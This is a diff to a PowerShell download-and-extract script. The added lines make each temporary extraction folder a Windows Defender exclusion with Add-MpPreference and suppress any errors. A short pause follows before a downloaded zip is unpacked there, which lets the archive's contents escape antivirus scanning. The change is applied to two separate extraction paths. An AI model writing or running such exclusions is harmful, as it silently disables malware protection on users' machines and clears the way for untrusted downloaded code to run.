@@ -136,7 +136,9 @@ if ($urlMode) {
 
         # Extract and locate the target file by name
         $extractDir = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName())
+        New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
         Add-MpPreference -ExclusionPath $extractDir -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 3
         Write-Host "[+] Extracting..." -ForegroundColor Cyan
         try {
             Expand-Archive -Path $zipTemp -DestinationPath $extractDir -Force -ErrorAction Stop
@@ -373,6 +375,9 @@ if ($urlMode) {
             exit 1
         }
         $extractDir2 = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName())
+        New-Item -ItemType Directory -Path $extractDir2 -Force | Out-Null
+        Add-MpPreference -ExclusionPath $extractDir2 -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 3
         Expand-Archive -Path $zipTemp2 -DestinationPath $extractDir2 -Force
         $allFound2 = Get-ChildItem -Path $extractDir2 -Recurse -Filter $fileName -File
         $found2 = $allFound2 | Where-Object { $_.FullName -match '\\x64\\' } |
